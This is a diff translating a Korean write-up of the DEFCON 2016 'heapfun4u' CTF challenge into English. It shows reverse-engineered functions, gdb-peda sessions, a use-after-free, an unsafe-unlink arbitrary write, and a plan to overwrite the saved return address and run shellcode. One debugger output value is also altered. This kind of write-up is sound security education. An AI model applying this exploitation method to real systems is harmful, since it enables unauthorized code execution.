@@ -33,7 +33,7 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$
 ```
 
-* 해당 프로그램을 실행하면 다음이 출력됩니다.
+* Running the program outputs the following:
 
 ```
 lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ ./heapfun4u 
@@ -49,28 +49,28 @@ lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ ./heapfun4u
 
 #### **Main**
 
-* 해당 함수는 다으뫄 같은 기능을 합니다.
-  + memset()함수를 이용해 gArray 영역을 '0'으로 초기화합니다.
-  + 사용자 입력 값이 'A'인 경우:  
-    - 먼저 gCount의 값이 100인지 합니다.
-      * 해당 값이 100이면 프로그램이 종료됩니다.
-      * 해당 변수는 buffer 공간을 생성한 갯수를 저장합니다.
-    - read()함수를 이용하여 사용자로 부터 생성할 buffer의 크기를 입력받습니다.
-      * 해당 값은 AllocateBuffer() 함수의 인자 값으로 전달됩니다.
-      * AllocateBuffer() 함수는 전달받은 값만큼 heap 영역을 생성한 후 주소를 리턴합니다.
-      * 할당된 Heap 영역은 gArray[count]에 저장됩니다.
-      * 할당된 Heap 영역의 size는 gArraySize[count]에 저장됩니다.
-  + 사용자 입력 값이 'F'인 경우:  
-    - PrintArray()함수를 호출합니다.
-      * 해당 함수는 gArray, gArraySize에 저장된 값을 모두 출력합니다.
-    - 그리고 read()함수를 이용하여 해제 할 buffer의 번호를 입력 받습니다.
-      * 입력받은 값은 FreeBuffer()함수에 다음과 같은 형태로 전달됩니다.
-      * Ex) FreeBuffer(gArray[입력받은 번호])
-      * 즉, gArray[]에 저장된 Heap 주소를 전달하는 것입니다.
-  + 사용자 입력 값이 'N'인 경우:
-    - NiceGuy() 함수를 호출합니다.
-  + 사용자 입력 값이 'W'인 경우:  
-    - WriteBuffer() 함수를 호출합니다.
+* This function performs the following operations:
+  + Initializes the gArray region to '0' using the memset() function.
+  + If user input is 'A':  
+    - First checks whether the value of gCount is 100.
+      * If this value is 100, the program exits.
+      * This variable tracks the count of allocated buffers.
+    - Reads the size of the buffer to create from the user using read().
+      * This value is passed as an argument to AllocateBuffer().
+      * AllocateBuffer() allocates heap memory of the requested size and returns its address.
+      * The allocated heap address is stored in gArray[count].
+      * The size of the allocated heap area is stored in gArraySize[count].
+  + If user input is 'F':  
+    - Calls the PrintArray() function.
+      * This function prints all values stored in gArray and gArraySize.
+    - Reads the index of the buffer to free from the user using read().
+      * The input value is passed to FreeBuffer() as follows:
+      * Ex) FreeBuffer(gArray[entered index])
+      * In other words, it passes the heap address stored in gArray[].
+  + If user input is 'N':
+    - Calls the NiceGuy() function.
+  + If user input is 'W':  
+    - Calls the WriteBuffer() function.
 
 ```c title="__main__"
 __int64 __fastcall main(__int64 a1, char **a2, char **a3)
@@ -149,8 +149,8 @@ __int64 __fastcall main(__int64 a1, char **a2, char **a3)
 
 #### **PrintArray**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + gArray[],gArraySize[]에 저장된 정보를 출력합니다.
+* This function performs the following operations:
+  + Prints the information stored in gArray[] and gArraySize[].
 
 ```c title="PrintArray"
 int PrintArray()
@@ -170,8 +170,8 @@ int PrintArray()
 
 #### **NiceGuy**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + char 형 변수를 선언 후 해당 변수가 사용하는 주소를 출력합니다.(Leak of stack addresss)
+* This function performs the following operations:
+  + Declares a char variable and prints its address (stack address leak).
 
 ```c title="NiceGuy"
 int NiceGuy()
@@ -183,10 +183,10 @@ int NiceGuy()
 
 #### **WriteBuffer**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + PrintArray() 함수를 이용해 생성된 Buffer 정보를 출력합니다.
-  + read()함수를 이용해 유저로 부터 입력받은 값을 저장할 Buffer 장소의 번호를 입력받습니다.
-  + read()함수를 이용해 유저가 원하는 Buffer 공간에 값을 입력받아 저장합니다.
+* This function performs the following operations:
+  + Prints allocated buffer information using PrintArray().
+  + Reads the index of the buffer to write to from the user using read().
+  + Reads user data and writes it to the designated buffer.
 
 ```c title="WriteBuffer"
 ssize_t WriteBuffer()
@@ -213,11 +213,11 @@ ssize_t WriteBuffer()
 }
 ```
 
-### Debuging
+### Debugging
 
-#### **AllocateBuffer / FreeBuffer**
+#### **AllocateBuffer / FreeBuffer**
 
-* 다음과 같이 Break point를 설정합니다.
+* Set breakpoints as follows:
 
 ```c title="Breakpoint"
 gdb-peda$ b *0x0400A6E
@@ -227,8 +227,8 @@ Breakpoint 2 at 0x400b4e
 gdb-peda$
 ```
 
-* 다음과 같이 AllocateBuffer 기능을 사용해 공간을 할당받습니다.
-  + 할당받은 memory 영역을 살펴보면 Heap과 같은 형태입니다.
+* Allocate memory using AllocateBuffer as follows:
+  + Examining the allocated memory region reveals that it resembles custom heap chunks.
 
 ```c title="gdb-peda"
 gdb-peda$ r
@@ -255,7 +255,7 @@ gdb-peda$ x/6gx 0x7ffff7ff5008 - 0x8
 gdb-peda$
 ```
 
-* 하지만 해당 프로세스의 memory map을 살펴보면 Heap, Stack 영역이 아닌 별도의 영역입니다.
+* However, checking the process memory map shows that this is an mmap-allocated region rather than the standard Heap or Stack.
 
 ```c title="info proc map"
 gdb-peda$ info proc map
@@ -284,10 +284,10 @@ Mapped addresss spaces:
 gdb-peda$
 ```
 
-#### **Check for UAF(Use After Free)**
+#### **Check for UAF (Use After Free)**
 
-* 해당 함수에서 제공하는 기능을 이용해 UAF 취약성이 발생하는지 확인해보겠습니다.
-* 다음과 같이 추가로 공간을 생성합니다.
+* Let's check whether a UAF vulnerability occurs using the provided functionality.
+* Allocate additional buffers as follows:
   + Size: 64
   + Size: 16
 
@@ -321,7 +321,7 @@ gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
 gdb-peda$
 ```
 
-* 그리고 다음과 같이 할당된 공간을 해제 합니다.
+* Then free the allocated buffers as follows:
 
 ```c title="gdb-peda"
 gdb-peda$ c
@@ -356,9 +356,9 @@ gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
 gdb-peda$
 ```
 
-* 다음과 같이 크기가 64인 공간을 할당합니다.
-  + AllocateBuffer 기능을 이용해 생성된 공간의 주소가 0x7ffff7ff5008 입니다.
-  + 해당 주소는 첫번째 생성한 공간과 같은 주소 입니다.
+* Next, allocate a buffer of size 64:
+  + The address of the buffer created by AllocateBuffer is 0x7ffff7ff5008.
+  + This address is identical to the first allocated buffer.
 
 ```c title="gdb-peda"
 gdb-peda$ c
@@ -386,9 +386,9 @@ gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
 gdb-peda$
 ```
 
-* 그리고 해당 프로그램은 해제된 Buffer 공간을 List에서 제거 하지 않습니다.
-  + 이로 인해 "FreeBuffer" 기능을 이용해 해제된 Buffer 공간을 계속 사용할 수 있습니다.
-* 이러한 이유로 UAF 취약성이 발생할 수 있습니다.
+* In addition, the program does not remove freed buffer pointers from the list.
+  + Because of this, buffers freed via "FreeBuffer" can still be written to.
+* This constitutes a Use-After-Free (UAF) vulnerability.
 
 ```c title="gdb-peda"
 gdb-peda$ c
@@ -408,10 +408,10 @@ Write where:
 
 #### **Check for unsafe unlink**
 
-* 우선 다음과 같은 크기의 Buffer를 생성합니다.
+* First, allocate buffers of the following sizes:
   + 16, 64, 16
-* 다음은 해당 크기대로 할당된 Buffer 메모리 구조입니다.
-  + 중요한 부분은 0x7ffff7ff5ff8에 저장된 값입니다.
+* Below is the memory structure of the allocated buffers:
+  + The critical value is stored at 0x7ffff7ff5ff8.
 
 ```c title="gdb-peda"
 gdb-peda$ b *0x0400B4E
@@ -431,7 +431,7 @@ gdb-peda$ x/gx 0x7ffff7ff5ff8
 0x7ffff7ff5ff8:	0x0000000000000000
 ```
 
-* 두번재 Buffer 공간을 해제하게 되면 0x7ffff7ff5ff8 영역에 2번째 buffer의 chunk size 값이 저장된 영역의 주소(0x00007ffff7ff5018)가 저장됩니다.
+* When the second buffer is freed, the address of the second buffer's chunk size (0x00007ffff7ff5018) is written to 0x7ffff7ff5ff8:
 
 ```c title="gdb-peda"
 Breakpoint 1, 0x0000000000400b4e in ?? ()
@@ -449,7 +449,7 @@ gdb-peda$ x/gx 0x7ffff7ff5ff8
 gdb-peda$
 ```
 
-* 이어서 첫번째 Buffer 공간을 해제하게 되면 0x7ffff7ff5ff8 영역에 1번째 buffer의 chunk size 값이 저장된 영역의 주소(0x00007ffff7ff5000)가 저장됩니다.
+* Subsequently, when the first buffer is freed, the address of the first buffer's chunk size (0x00007ffff7ff5000) is stored in the 0x7ffff7ff5ff8 area:
 
 ```c title="gdb-peda"
 gdb-peda$ c
@@ -479,21 +479,21 @@ gdb-peda$ x/gx 0x7ffff7ff5ff8
 gdb-peda$
 ```
 
-* chunk size 값이 저장된 영역의 주소를 저장할 위치 값은 다음과 같이 계산됩니다.
-  + Forward Pointer의 주소 값(0x7ffff7ff5078) + Forward Pointer의 주소영역에 저장된 값(0x0f80) =  0x7ffff7ff5ff8
-  + 즉, Forward Pointer의 주소영역에 저장된 값(0x0f80)에 의해 chunk size 값이 저장될 영역의 주소가 결정됩니다.
-  + 이러한 취약성을 이용해 원하는 주소에 해제된 Buffer의 시작 주소를 저장할 수 있습니다.
+* The location where the chunk size address is stored is calculated as follows:
+  + Forward Pointer address (0x7ffff7ff5078) + value stored at Forward Pointer (0x0f80) = 0x7ffff7ff5ff8
+  + In other words, the value stored at the Forward Pointer determines the target destination address where the chunk size address will be written.
+  + Using this vulnerability, we can write the start address of a freed buffer to any arbitrary address.
 
-#### **PoC(unsafe unlink)**
+#### **PoC (unsafe unlink)**
 
-* 다음과 같은 방법으로 unsafe unlink를 검증할 수 있습니다.
-  + Top chunk의 값을 0xf80에서 0xfa0으로 변경합니다.
-  + 그리고 첫번째 Buffer 영역을 해제합니다.
+* We can verify unsafe unlink as follows:
+  + Change the Top chunk value from 0xf80 to 0xfa0.
+  + Then free the first buffer.
 
 ```c title="gdb-peda"
 gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
 0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
-0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
+0x7ffff7ff5010:	0x0000000000000000	0x0000000000000043
 0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
 0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
 0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
@@ -523,7 +523,7 @@ gdb-peda$ x/gx 0x7ffff7ff5ff8
 gdb-peda$
 ```
 
-* Top chunk 값 변경으로 인해 해제된 Buffer 영역의 시작 주소 값이 0x7ffff7ff5ff8 이 아닌 0x7ffff7ff6018 영역에 저장되었습니다.
+* Modifying the Top chunk value causes the starting address of the freed buffer to be written to 0x7ffff7ff6018 instead of 0x7ffff7ff5ff8:
 
 ```c title="gdb-peda"
 gdb-peda$ c
@@ -558,21 +558,21 @@ gdb-peda$
 ### Structure of Exploit code
 
 :::note [Description]
-1. Unsafe unlink 취약성이 발생할 수 있는 Memory 구조을 생성합니다.
-   1. 첫번째 공간할당은 해당 프로그램에서 할당되는 최소 크기(16) 만큼 공간을 할당합니다.
-   2. 두번째 공간할당은 Fake chunk를 저장하기 위한 공간을 할당(128) 합니다.
-   3. 세번째 공간할당은 최소 크기(16)만큼 공간을 할당합니다.
-2. UAF 취약성 생성합니다.
-   1. 두번째 Buffer,첫번째 Buffer을 해제 합니다.
-   2. Fake chunk를 저장 할 네번째 Buffer 공간(128)을 할당 합니다.
-3. Unsafe unlink 취약성을 발생 시키기 위한 Fake chunk를 네번째 Buffer 공간에 저장합니다.  
-   1. 다음과 같은 구조의 Fake chunk를 저장합니다.
-   2. p64(rip offset) + p64(0) + p64(Fake buffer size) + p64(fill fake buffer) + p64(fake free chunk size) + p64(forward point) + p64(backward point)
-4. Unsafe unlink 취약성 실행
-   1. 두번째 Buffer를 해제
-      1. Unsafe unlink 취약성에 의해 RIP 값이 저장되어 있는 위치에 "두번째 Buffer 공간의 chunk size"가 저장된 주소 값이 저장됩니다.
-5. 4번째 Buffer에 shellcode를 저장합니다.
-6. 해당 프로그램을 종료합니다.  
+1. Set up a memory layout to trigger the unsafe unlink vulnerability:
+   1. First allocation: allocate minimum size (16).
+   2. Second allocation: allocate space (128) to hold a fake chunk.
+   3. Third allocation: allocate minimum size (16).
+2. Create UAF condition:
+   1. Free the second buffer, then free the first buffer.
+   2. Allocate a fourth buffer (128) to store the fake chunk.
+3. Write the fake chunk into the fourth buffer to trigger unsafe unlink:
+   1. Construct and store a fake chunk with the following structure:
+   2. `p64(rip offset) + p64(0) + p64(Fake buffer size) + p64(fill fake buffer) + p64(fake free chunk size) + p64(forward pointer) + p64(backward pointer)`
+4. Trigger unsafe unlink:
+   1. Free the second buffer.
+      1. Unsafe unlink overwrites the RIP (saved return address) location on the stack with the address where the second buffer's chunk size is stored.
+5. Store shellcode in the 4th buffer.
+6. Exit the program to trigger code execution.
 :::
 
 * The following information is required for an attack:
@@ -585,10 +585,10 @@ gdb-peda$
 
 #### **RIP Offset**
 
-* 다음과 같은 방법으로 RIP Offset을 얻을 수 있습니다.
-  + "Nice guy" 기능을 호출해서 Base Addresss(0x7fffffffe19c)를 구합니다.
-  + 해당 프로그램 종료시 ret명령어가 사용하는 RSP 레지스터의 주소는 0x7fffffffe2d8 입니다.
-  + 0x7fffffffe2d8 - 0x7fffffffe19c = 0x13c
+* The RIP offset can be obtained as follows:
+  + Call the "Nice guy" function to obtain the stack base leak address (0x7fffffffe19c).
+  + When the program exits, the RSP register address used by the ret instruction is 0x7fffffffe2d8.
+  + 0x7fffffffe2d8 - 0x7fffffffe19c = 0x13c
 
 ```c title="gdb-peda"
 gdb-peda$ r
